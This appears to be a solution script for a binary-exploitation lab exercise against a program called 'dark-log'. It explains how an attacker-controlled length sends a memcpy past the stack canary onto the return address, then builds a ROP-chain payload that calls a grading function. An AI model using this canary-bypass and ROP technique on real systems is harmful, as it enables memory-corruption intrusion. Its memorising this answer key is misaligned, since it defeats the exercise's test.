#!/usr/bin/env python3
"""Task: bypass the stack canary in attack/dark-log.

dark-log's input() frame:

    rbp-0x120 : f.expression[128]
    rbp-0xa0  : f.logMsg[128]
    rbp-0x20  : f.len (int)
    rbp-0x08  : stack canary
    rbp       : saved rbp
    rbp+8     : saved return address

The program does:

    memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression));

with a fixed length of 128 bytes and an attacker-controlled f.len.  By
putting 0xa8 into f.len, the destination becomes

    (rbp - 0xa0) + 0xa8 == rbp + 8

so the copy starts at the saved return address and never touches the
canary at rbp-8.  The 128 bytes copied are exactly the first 128 bytes of
our input, which therefore become a ROP chain.

The chain calls grade_eval(4).  After printing, it returns to 0 and the
process dies with SIGSEGV; a clean exit is not needed for the check.
"""

import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


chain = bytearray()
chain += p64(0x4017F4)      # ret (alignment)
chain += p64(0x4018A3)      # pop rdi; ret
chain += p64(4)             # grade = 4
chain += p64(0x401677)      # grade_eval
chain += p64(0)             # terminate after printing

# f.len sits at offset 0x100 from f.expression.  Its value 0xa8 moves the
# memcpy destination to rbp+8.
payload = bytes(chain).ljust(0x100, b"\x90")
payload += struct.pack("<I", 0xA8)

assert len(payload) == 0x104
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
